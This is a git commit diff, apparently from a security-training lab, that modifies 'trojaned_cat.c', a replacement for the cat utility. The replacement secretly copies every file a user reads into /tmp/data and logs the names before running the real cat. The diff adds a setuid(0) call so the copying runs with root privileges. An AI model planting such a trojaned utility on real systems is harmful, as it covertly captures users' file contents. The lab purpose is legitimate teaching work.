f07c808c56a9489563c5d9a643e78d7089cb38f6
James Newman <jameshildrethnewman@gmail.com>
2019-09-18 02:03:40 +0000

    turned strace into a terraform scenario, updated to run on ubuntu bionic

--- files/trojaned_cat.c
+++ files/trojaned_cat.c
@@ -10,28 +10,32 @@
  *   (1) first copies cat output to a file with name
  *       /tmp/data/<username>-<filenameWithoutSlash>-<datetime>
  *       (the <filenameWithoutSlash> part is new and helpful for finding files cat-ted by
- *       user with particular names. 
+ *       user with particular names.
  *   (2) Append filename /tmp/data/<username>-<filenameWithoutSlash>-<datetime>
- *       to /tmp/data/filenames using /bin/echo 
- *   (3) Then performs real cat via /bin/cat <arg1> ... <argn> // end with real cat  
- * 
+ *       to /tmp/data/filenames using /bin/echo
+ *   (3) Then performs real cat via /bin/cat <arg1> ... <argn> // end with real cat
+ *
  * 2016/03/07:
- * Improved trojaned version of the cat program that 
+ * Improved trojaned version of the cat program that
  *   (1) first copies cat output to a file with name /tmp/data/<username>-<datetime>
  *   (2) Then performs real cat via /bin/cat <arg1> ... <argn> // end with real cat!
  * This version avoids the "doubling explosion" of previous version, in which
- * cat on the single carnivore file double the size of the file. 
- *  
- * Kahea made /tmp/data permisions 733, which improves problem by making it 
- * hard to stumble upon copied cat-ted files. 
- *  
- * Fall 2014: First version of this file  
+ * cat on the single carnivore file double the size of the file.
+ *
+ * Kahea made /tmp/data permisions 733, which improves problem by making it
+ * hard to stumble upon copied cat-ted files.
+ *
+ * Fall 2014: First version of this file
  */
 int main (int argn, char* argv[], char* arge[]) {
-  char timeBuff[120]; // buffer for date/time  
+  uid_t saved_uid;
+  char timeBuff[120]; // buffer for date/time
   char writeToFileName[1024]; // buffer for creating string that redirects to filename
   char command[1024]; // buffer for command
   int i;
+
+  saved_uid = getuid();
+  setuid(0);
 
   // Create date/time string
   time_t now = time (0);
@@ -64,7 +68,7 @@ int main (int argn, char* argv[], char* arge[]) {
            "%s%s-%s-%s", writeToFileNameStart, userName, fileNameNoSlash, timeBuff);
   // printf("writeToFileName=%s\n", writeToFileName);
 
-  // printf("writeToFileName=%s\n", writeToFileName);    
+  // printf("writeToFileName=%s\n", writeToFileName);
   // Build cat command for saving user data in /tmp/data/<username>-<datetime>:
   // /bin/cat argv[1] ... argv[n] > /tmp/data/<username>-<datetime>
   char* catCommand = "/bin/cat "; // note space at end
@@ -88,7 +92,7 @@ int main (int argn, char* argv[], char* arge[]) {
     strncat(command, writeToFileName, strlen(writeToFileName) + 1);
     // printf("cat command=%s\n", command);
     if (argn >= 1) {
-      system(command); // Perform /bin/cat argv[1] ... argv[n] > /tmp/data/<username>-<datetime>   
+      system(command); // Perform /bin/cat argv[1] ... argv[n] > /tmp/data/<username>-<datetime>
     }
   }
   // Build echo command for appending filename to /tmp/data/filenames:
@@ -114,9 +118,7 @@ int main (int argn, char* argv[], char* arge[]) {
   }
 
   // Finally execute original command, using /bin/cat for argv[0]
+  setuid(saved_uid); // We DO NOT want students to be able to read any file
   argv[0] = "/bin/cat";
   execve(argv[0], argv, arge); // end with real cat!
 }
-
-
-
